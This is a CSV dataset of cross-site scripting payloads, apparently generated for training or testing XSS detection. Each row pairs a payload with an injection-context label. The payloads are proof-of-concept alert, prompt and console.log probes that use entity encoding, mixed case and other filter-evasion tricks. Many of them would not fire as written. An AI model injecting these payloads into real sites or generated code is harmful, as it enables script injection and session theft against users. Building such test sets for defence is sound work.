payload,context
""" on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(1) """,attribute_escape
"<img onend=confirm(String.fromCharCode(88,83,83))>",tag_injection
<imG oNloAd=ProMpt(1)/>,tag_injection
location.href=%22javascript:prompt(document.cookie)%22,dom_sink
%3Cimg onload=console.log('XSS')/%3E,tag_injection
' onbegin=confirm(document.domain) ',attribute_escape
"<img onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" oNrePeaT=pRomPt(LocAtiOn.HasH) """,attribute_escape
"""><Img onLoaD=pRomPt(LocAtiOn.HasH)>",tag_injection
"<img on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img onanimationend=\u0061lert(1)>",tag_injection
"""%3E%3Cimg onbegin=alert(location.hash)%3E",tag_injection
%22 onend=alert(document.domain) %22,attribute_escape
<imG oNanImaTioNenD=cOnsOle.loG(1)>,tag_injection
<img on&#97;nim&#97;tionc&#97;nc&#101;l=prompt('XSS')>,tag_injection
"document.body.innerHTML=""%3Cimg src=x onerror=console.log(String.fromCharCode(88,83,83))%3E""",dom_sink
"""%3E%3Cimg onbegin=prompt(document.domain)%3E",tag_injection
%3Cimg onbegin=prompt(document.cookie)/%3E,tag_injection
<img onanimationcancel=alert(1)/>,tag_injection
<img on&#101;rror=confirm('XSS')/>,tag_injection
<script>confirm`location.hash`</script>,script_injection
' oNanImaTioNitEraTioN=cOnfIrm('XSS') ',attribute_escape
<imG oNbeGin=prOmpT(1)/>,tag_injection
"<imG oNerRor=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<imG oNanImaTioNcaNceL=pRomPt(1)/>,tag_injection
""" on&#97;nim&#97;tionst&#97;rt=prompt(1) """,attribute_escape
"%22 onanimationend=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
<script>alert(1)</script>,script_injection
"""><img on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
"%27 onanimationstart=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
' onbegin=\u0061lert(1) ',attribute_escape
"LocAtiOn.HreF=""JavAscRipT:pRomPt(DocUmeNt.CooKie)""",dom_sink
%22><img onbegin=prompt(document.cookie)>,tag_injection
%22 onerror=prompt(location.hash) %22,attribute_escape
%3Cimg onanimationend=alert(document.domain)%3E,tag_injection
"""><img onanimationstart=console.log(String.fromCharCode(88,83,83))>",tag_injection
<img onerror=alert('XSS')/>,tag_injection
<img onerror=prompt(%27XSS%27)>,tag_injection
"""%3E%3Cimg onerror=prompt('XSS')%3E",tag_injection
<img onanimationcancel=prompt(%27XSS%27)>,tag_injection
"<img onload=alert(String.fromCharCode(88,83,83))/>",tag_injection
%22><img onerror=alert(document.cookie)>,tag_injection
<imG oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.coOkiE)/>,tag_injection
%22><img onrepeat=console.log(%27XSS%27)>,tag_injection
<img onbegin=alert('XSS')/>,tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cimg onanimationstart=alert(document.domain)/%3E,tag_injection
<img on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
javascript:\u0061lert(location.hash),js_uri
' oNloAd=ConSolE.lOg(DocUmeNt.CooKie) ',attribute_escape
""" oNrePeaT=cOnfIrm(loCatIon.haSh) """,attribute_escape
' oNenD=cOnfIrm(doCumEnt.coOkiE) ',attribute_escape
<script>confirm`'XSS'`</script>,script_injection
""" oNrePeaT=cOnsOle.loG(lOcaTioN.hAsh) """,attribute_escape
<scRipT>pRomPt`'XSS'`</sCriPt>,script_injection
<script>&#97;l&#101;rt`loc&#97;tion.h&#97;sh`</script>,script_injection
%3Cimg onanimationend=console.log(document.domain)/%3E,tag_injection
"<img onend=prompt(String.fromCharCode(88,83,83))>",tag_injection
J&#97;VasCriPt:ConSolE.lOg(DocUmeNt.DomAin),js_uri
"setTimeout(""\u0061lert(1)"",0)",dom_sink
%22 onanimationend=alert(document.cookie) %22,attribute_escape
<img onbegin=console.log(location.hash)>,tag_injection
"""><img onerror=confirm(String.fromCharCode(88,83,83))>",tag_injection
<imG oNenD=aLerT(lOcaTioN.hAsh)>,tag_injection
<scRipT>/*/aLerT(1)</ScrIpt>,script_injection
"""%3E%3Cimg onanimationstart=console.log(location.hash)%3E",tag_injection
"%3Cscript%3E/x/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
' onanimationiteration=confirm(document.domain) ',attribute_escape
"""><img onrepeat=\u0061lert('XSS')>",tag_injection
"""%3E%3Cimg onanimationend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"""><img onanimationiteration=confirm(document.domain)>",tag_injection
<scRipT>/X/cOnfIrm(1)</sCriPt>,script_injection
%27 onanimationstart=console.log(location.hash) %27,attribute_escape
"""><img onerror=console.log(location.hash)>",tag_injection
"setTimeout(%22alert(String.fromCharCode(88,83,83))%22,0)",dom_sink
' oNbeGin=coNfiRm('XSS') ',attribute_escape
%3Cscript%3E//confirm(location.hash)%3C/script%3E,script_injection
' on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
' onb&#101;gin=&#97;l&#101;rt(1) ',attribute_escape
document.write(%22<img src=x onerror=confirm(location.hash)>%22),dom_sink
<img onanimationstart=\u0061lert(document.cookie)>,tag_injection
"location.href=""javascript:console.log(location.hash)""",dom_sink
"""><img on&#97;nim&#97;tionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"%22 onanimationiteration=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
<script>//console.log(1)</script>,script_injection
<script>/*/\u0061lert('XSS')</script>,script_injection
' onlo&#97;d=&#97;l&#101;rt('XSS') ',attribute_escape
%3Cimg onanimationstart=alert('XSS')%3E,tag_injection
<img on&#101;nd=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
"javascript:void(prompt(String.fromCharCode(88,83,83)))",js_uri
<img on&#101;nd=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
<script>consol&#101;.log`loc&#97;tion.h&#97;sh`</script>,script_injection
"' onanimationstart=alert(String.fromCharCode(88,83,83)) '",attribute_escape
"<script>confirm(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"j&#97;vascript:console.log(String.fromCharCode(88,83,83))",js_uri
<img onend=alert(document.domain)>,tag_injection
""" onanimationiteration=\u0061lert(1) """,attribute_escape
<img onanimationstart=confirm(1)>,tag_injection
"<img onbegin=console.log(String.fromCharCode(88,83,83))>",tag_injection
' oNanImaTioNitEraTioN=cOnsOle.loG(dOcuMenT.cOokIe) ',attribute_escape
<imG oNanImaTioNenD=aLerT(1)>,tag_injection
%3Cimg onerror=confirm(1)/%3E,tag_injection
<img on&#101;rror=prompt(1)/>,tag_injection
<imG oNerRor=coNfiRm(DocUmeNt.DomAin)>,tag_injection
<img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log('XSS')>,tag_injection
<script>alert`document.cookie`</script>,script_injection
%3Cimg onload=prompt(location.hash)%3E,tag_injection
""" onend=confirm(1) """,attribute_escape
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
<script>//prompt(location.hash)</script>,script_injection
"eval(""\u0061lert('XSS')"")",dom_sink
"<script>/*/confirm(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
""" on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(1) """,attribute_escape
<img onload=\u0061lert(location.hash)/>,tag_injection
<img onend=prompt(document.cookie)>,tag_injection
"""><Img onErrOr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"""><img on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
"<scRipT>/X/cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection
"s&#101;tTim&#101;out(""confirm('XSS')"",0)",dom_sink
<img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(1)/>,tag_injection
"""><Img onRepEat=coNsoLe.Log(loCatIon.haSh)>",tag_injection
javascr	ipt:confirm(document.domain),js_uri
""" oNanImaTioNitEraTioN=aLerT(dOcuMenT.dOmaIn) """,attribute_escape
"""%3E%3Cimg onerror=alert(String.fromCharCode(88,83,83))%3E",tag_injection
""" onr&#101;p&#101;&#97;t=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<script>//confirm('XSS')</script>,script_injection
"""><img onanimationiteration=console.log(document.cookie)>",tag_injection
"""%3E%3Cimg onrepeat=prompt(document.domain)%3E",tag_injection
"""><img onload=console.log(1)>",tag_injection
"%27 onbegin=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
<imG oNbeGin=alErt(doCumEnt.coOkiE)>,tag_injection
' on&#97;nim&#97;tionst&#97;rt=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape
%22 onbegin=confirm(1) %22,attribute_escape
%3Cimg onanimationiteration=alert(document.domain)/%3E,tag_injection
"""><img onbegin=prompt(document.domain)>",tag_injection
"""><Img onAniMatIonStaRt=ProMpt(1)>",tag_injection
"location.href=%22javascript:alert(String.fromCharCode(88,83,83))%22",dom_sink
"<imG oNanImaTioNitEraTioN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
"%3Cscript%3E/*/console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
""" oNrePeaT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
JavAscRipT:pRomPt('XSS'),js_uri
"""><img onanimationend=alert(String.fromCharCode(88,83,83))>",tag_injection
<imG oNenD=cOnsOle.loG(lOcaTioN.hAsh)/>,tag_injection
<img onbegin=confirm(%27XSS%27)/>,tag_injection
"""><img onlo&#97;d=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
"<scr	ipt>//alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
""" oNbeGin=coNfiRm(DocUmeNt.DomAin) """,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(1)>"")",dom_sink
<scRipT>/X/pRomPt(1)</scRipT>,script_injection
"""><Img onLoaD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<scRipT>//alErt(doCumEnt.doMaiN)</scRipT>,script_injection
' on&#97;nim&#97;tionst&#97;rt=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
<img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
"document.body.innerHTML=""<img src=x onerror=\u0061lert(String.fromCharCode(88,83,83))>""",dom_sink
"%22><img onbegin=alert(String.fromCharCode(88,83,83))>",tag_injection
%22 onrepeat=alert(document.domain) %22,attribute_escape
""" on&#97;nim&#97;tionst&#97;rt=confirm('XSS') """,attribute_escape
%3Cimg onanimationstart=prompt(1)%3E,tag_injection
<img onanimationstart=alert(document.domain)>,tag_injection
<scr	ipt>/x/prompt(document.domain)</scr	ipt>,script_injection
%3Cimg onanimationcancel=alert(1)%3E,tag_injection
%3Cimg onbegin=alert(location.hash)/%3E,tag_injection
""" onrepeat=prompt(1) """,attribute_escape
JavAscRipT:vOid(alErt(1)),js_uri
javascript:void(confirm(document.domain)),js_uri
<img onrepeat=console.log('XSS')>,tag_injection
""" on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
<scr	ipt>/x/alert('XSS')</scr	ipt>,script_injection
%22><img onrepeat=console.log(document.cookie)>,tag_injection
""" onb&#101;gin=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape
<scr	ipt>prompt('XSS')</scr	ipt>,script_injection
<img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
<img onlo&#97;d=confirm('XSS')>,tag_injection
<img onerror=\u0061lert(document.cookie)/>,tag_injection
"location.href=""javascr	ipt:console.log(1)""",dom_sink
<script>/x/&#97;l&#101;rt(1)</script>,script_injection
%3Cimg onend=alert(document.cookie)/%3E,tag_injection
' oNbeGin=alErt(doCumEnt.coOkiE) ',attribute_escape
%22><img onload=console.log(location.hash)>,tag_injection
"<img onrepeat=console.log(String.fromCharCode(88,83,83))/>",tag_injection
<script>/x/alert(location.hash)</script>,script_injection
' onanimationend=console.log(1) ',attribute_escape
' on&#101;nd=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
%27 onbegin=confirm(document.domain) %27,attribute_escape
"""%3E%3Cimg onanimationend=confirm('XSS')%3E",tag_injection
"document.write(""<img src=x onerror=\u0061lert(document.domain)>"")",dom_sink
%27 onend=prompt(1) %27,attribute_escape
""" onanimationstart=console.log(document.domain) """,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)>"")",dom_sink
"setTimeout(""alert(location.hash)"",0)",dom_sink
"location.href=""javascr	ipt:console.log(document.cookie)""",dom_sink
<img onrepeat=confirm(document.cookie)>,tag_injection
<img onload=confirm(document.domain)>,tag_injection
<script>\u0061lert`document.domain`</script>,script_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
<imG oNanImaTioNstArt=coNsoLe.Log(doCumEnt.coOkiE)>,tag_injection
javascript:void(confirm(document.cookie)),js_uri
"""><img onanimationstart=prompt(document.cookie)>",tag_injection
' oNanImaTioNenD=cOnsOle.loG(dOcuMenT.cOokIe) ',attribute_escape
j&#97;v&#97;script:void(prompt(docum&#101;nt.cooki&#101;)),js_uri
<scr	ipt>confirm(document.cookie)</scr	ipt>,script_injection
javascr	ipt:void(alert(1)),js_uri
j&#97;v&#97;script:prompt(docum&#101;nt.dom&#97;in),js_uri
%22><img onrepeat=confirm(location.hash)>,tag_injection
%3Cimg onrepeat=confirm(document.cookie)%3E,tag_injection
%3Cimg onbegin=console.log(document.domain)%3E,tag_injection
<imG oNbeGin=prOmpT(lOcaTioN.hAsh)>,tag_injection
<script>prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
"""><Img onErrOr=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
j&#97;v&#97;script:void(&#97;l&#101;rt('XSS')),js_uri
<img on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"""><img onrepeat=console.log(1)>",tag_injection
javascript:console.log('XSS'),js_uri
""" onanimationend=alert(String.fromCharCode(88,83,83)) """,attribute_escape
<scRipT>/*/cOnfIrm('XSS')</ScrIpt>,script_injection
<script>confirm(location.hash)</script>,script_injection
"j&#97;vascr	ipt:console.log(String.fromCharCode(88,83,83))",js_uri
"""><img on&#101;nd=consol&#101;.log(1)>",tag_injection
' onanimationend=\u0061lert(document.cookie) ',attribute_escape
"""><img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(1)>",tag_injection
"%22 onend=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"document.body.innerHTML=""<img src=x onerror=console.log('XSS')>""",dom_sink
<img onanimationstart=console.log(document.domain)>,tag_injection
""" on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt('XSS') """,attribute_escape
<img on&#97;nim&#97;tion&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%22 onanimationcancel=prompt(%27XSS%27) %22,attribute_escape
%22 onload=prompt(1) %22,attribute_escape
%27 onerror=alert(1) %27,attribute_escape
%3Cscript%3E/x/alert(document.domain)%3C/script%3E,script_injection
%27 onbegin=prompt(document.cookie) %27,attribute_escape
j&#97;vascript:alert(%27XSS%27),js_uri
"""><img onanimationiteration=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><Img onErrOr=ConFirM('XSS')>",tag_injection
<img onrepeat=confirm(document.cookie)/>,tag_injection
""" onanimationcancel=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
<img on&#101;rror=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"""%3E%3Cimg onrepeat=confirm(1)%3E",tag_injection
""" onanimationiteration=\u0061lert(document.domain) """,attribute_escape
<imG oNanImaTioNenD=cOnsOle.loG(1)/>,tag_injection
""" onfocus=prompt(docum&#101;nt.cooki&#101;) &#97;utofocus=""",attribute_escape
""" oNanImaTioNitEraTioN=cOnfIrm('XSS') """,attribute_escape
"<img onanimationstart=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
%22><img onanimationstart=prompt(%27XSS%27)>,tag_injection
' on&#101;rror=prompt('XSS') ',attribute_escape
javascr	ipt:void(alert(document.domain)),js_uri
' onerror=alert(document.cookie) ',attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in)""",dom_sink
%3Cscript%3Econfirm('XSS')%3C/script%3E,script_injection
<img on&#101;rror=&#97;l&#101;rt(1)>,tag_injection
"<img onanimationiteration=confirm(String.fromCharCode(88,83,83))/>",tag_injection
"' oNerRor=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
<scr	ipt>/*/prompt(location.hash)</scr	ipt>,script_injection
j&#97;vascript:prompt(location.hash),js_uri
"""><img on&#101;nd=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
' oNbeGin=coNsoLe.Log(1) ',attribute_escape
%22><img onend=confirm(location.hash)>,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT('XSS')>""",dom_sink
<img onanimationstart=console.log(location.hash)>,tag_injection
<imG oNbeGin=coNfiRm(1)/>,tag_injection
"%22><img onanimationiteration=confirm(String.fromCharCode(88,83,83))>",tag_injection
%27 onrepeat=prompt(1) %27,attribute_escape
%22 onbegin=console.log(location.hash) %22,attribute_escape
<img onr&#101;p&#101;&#97;t=prompt('XSS')/>,tag_injection
"document.write(""<img src=x onerror=console.log(document.cookie)>"")",dom_sink
"location.href=""javascr	ipt:prompt('XSS')""",dom_sink
""" oNenD=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
' oNerRor=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
<imG oNenD=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
<imG oNloAd=ConSolE.lOg(LocAtiOn.HasH)/>,tag_injection
%3Cimg onrepeat=alert('XSS')%3E,tag_injection
""" onanimationiteration=console.log(document.domain) """,attribute_escape
<script>/x/alert(document.cookie)</script>,script_injection
"setTimeout(""\u0061lert(document.cookie)"",0)",dom_sink
"""%3E%3Cimg onanimationcancel=alert(1)%3E",tag_injection
"%3Cscript%3E/*/alert(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
%3Cimg onanimationcancel=alert(document.cookie)%3E,tag_injection
<img onend=console.log(1)>,tag_injection
%22 onerror=console.log(document.domain) %22,attribute_escape
<img onerror=\u0061lert(document.cookie)>,tag_injection
"' onload=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
"javascript:prompt(String.fromCharCode(88,83,83))",js_uri
J&#97;VasCriPt:ConFirM('XSS'),js_uri
%3Cimg onanimationiteration=console.log(location.hash)%3E,tag_injection
<imG oNanImaTioNstArt=alErt(doCumEnt.doMaiN)/>,tag_injection
"document.write(""%3Cimg src=x onerror=console.log('XSS')%3E"")",dom_sink
<imG oNanImaTioNstArt=coNsoLe.Log(1)/>,tag_injection
"""%3E%3Cimg onanimationstart=prompt(document.cookie)%3E",tag_injection
"""><img onend=\u0061lert(document.cookie)>",tag_injection
<scr	ipt>/*/confirm(location.hash)</scr	ipt>,script_injection
"%22><img onanimationstart=console.log(String.fromCharCode(88,83,83))>",tag_injection
eval(%22console.log(document.cookie)%22),dom_sink
' on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape
"' oNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
javascr	ipt:void(confirm(location.hash)),js_uri
<script>/*/confirm(docum&#101;nt.cooki&#101;)</script>,script_injection
%3Cimg onanimationcancel=alert('XSS')%3E,tag_injection
<imG oNanImaTioNstArt=prOmpT(lOcaTioN.hAsh)>,tag_injection
%22><img onend=confirm(document.domain)>,tag_injection
